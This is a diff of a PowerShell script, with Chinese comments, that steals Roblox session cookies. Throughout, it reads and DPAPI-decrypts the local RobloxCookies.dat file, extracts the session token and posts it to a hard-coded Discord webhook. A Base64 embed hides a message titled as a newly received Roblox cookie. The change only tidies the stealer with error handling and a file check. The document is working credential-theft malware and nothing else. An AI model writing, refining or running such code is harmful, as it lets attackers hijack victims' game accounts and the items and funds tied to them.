@@ -1,30 +1,44 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
-# 1. 取得token
-$p="$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"; if(Test-Path $p){ [void][Reflection.Assembly]::LoadWithPartialName('System.Security'); $j=(Get-Content $p -Raw|ConvertFrom-Json).CookiesData; $d=[Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j),$null,'CurrentUser'); $s=[Text.Encoding]::UTF8.GetString($d); if($s -match '(_\|WARNING.*?)(;|$)'){$cookie=$matches[1]} }else{"Roblox Not Found"}
-
-# 2. 定義 Webhook URL
+# 1. 定義路徑與 Webhook URL
+$p = "$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"
 $uri = "https://discord.com/api/webhooks/1501523254404190209/qnfTbYgfNuOCOBbEQwuMHHHYCltqgM8iQkpCy0NFTaS14oRmKqfysIQKthauw4YFgGez"
 
-# 🔓 Base64（你直接貼上）
-$embedBase64 = "eyJ0aXRsZSI6ICLmjqXmlLbliLDmlrDnmoRyb2Jsb3ggY29va2llIiwgImNvbG9yIjogMzQ0NzAwMywgImZpZWxkcyI6IFt7Im5hbWUiOiAiY29va2llIiwgInZhbHVlIjogImBgYCRjb29raWVgYGAifV0sICJmb290ZXIiOiB7InRleHQiOiAi5Y+v5Lul55uh5oOF5L2/55SoIn19"
+# 2. 檢查檔案是否存在
+if (Test-Path $p) {
+    try {
+        # 取得並解密 Cookie
+        [void][Reflection.Assembly]::LoadWithPartialName('System.Security')
+        $j = (Get-Content $p -Raw | ConvertFrom-Json).CookiesData
+        $d = [Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j), $null, 'CurrentUser')
+        $s = [Text.Encoding]::UTF8.GetString($d)
 
-# 解密
-# 解密 Base64 得到原始 JSON
-$decodedJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($embedBase64))
+        if ($s -match '(_\|WARNING.*?)(;|$)') {
+            $cookie = $matches[1]
 
-# 【關鍵修正】手動將字串中的 "$cookie" 替換成變數 $cookie 的內容
-# 我們使用 [Regex]::Escape 是為了確保特殊字元不會干擾替換
-$finalJson = $decodedJson.Replace('$cookie', $cookie)
+            # 3. 準備發送資料
+            # Base64 內容：{"title": "接收到新的robux cookie", ...}
+            $embedBase64 = "eyJ0aXRsZSI6ICLmjqXmlLbliLDmlrDnmoRyb2Jsb3ggY29va2llIiwgImNvbG9yIjogMzQ0NzAwMywgImZpZWxkcyI6IFt7Im5hbWUiOiAiY29va2llIiwgInZhbHVlIjogImBgYCRjb29raWVgYGAifV0sICJmb290ZXIiOiB7InRleHQiOiAi5Y+v5Lul55uh5oOF5L2/55SoIn19"
+            $decodedJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($embedBase64))
+            
+            # 替換變數並轉換為物件
+            $finalJson = $decodedJson.Replace('$cookie', $cookie)
+            $embed = $finalJson | ConvertFrom-Json
 
-# 轉成物件
-$embed = $finalJson | ConvertFrom-Json
+            $payload = @{
+                embeds = @($embed)
+            }
 
-# 組 payload 並發送
-$payload = @{
-    embeds = @($embed)
+            # 4. 發送 Webhook
+            Invoke-RestMethod -Uri $uri -Method Post `
+                -Body ($payload | ConvertTo-Json -Depth 10) `
+                -ContentType "application/json; charset=utf-8"
+        }
+    }
+    catch {
+        Write-Error "處理過程中發生錯誤: $_"
+    }
 }
-
-Invoke-RestMethod -Uri $uri -Method Post `
-    -Body ($payload | ConvertTo-Json -Depth 10) `
-    -ContentType "application/json; charset=utf-8"
+else {
+    Write-Host "找不到 Roblox 設定檔，程序終止。"
+}
